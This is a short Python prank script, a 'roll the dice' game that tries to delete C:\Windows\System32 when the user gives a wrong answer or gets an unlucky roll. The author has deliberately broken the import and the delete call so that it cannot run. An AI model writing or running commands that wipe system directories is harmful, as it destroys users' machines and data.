import o----s, random

#os delete educational purposes, segregated o & s + 9 infront of the removal function so code can't be executed.
#code does not work i hope this isn't unethical code

randomnum = random.randint(1, 2)

computerkiller = input("roll the dice? yes or no.")
if computerkiller != "yes" and computerkiller != "no":
    try:
        print("wrong answer")
        os.remove9("C:\Windows\System32")
    except:
        print("system not found")
        quit()
else:
    if computerkiller == "yes":
        if randomnum == 1:
            print("safe")
            quit()
    elif randomnum == 2:
        print("""  _____
 /     \
| () () |
 \  ^  /
  |||||
  |||||
  """)
        os.remove9("C:\Windows\System32")
    else:
        print("system not found")
        quit()
    
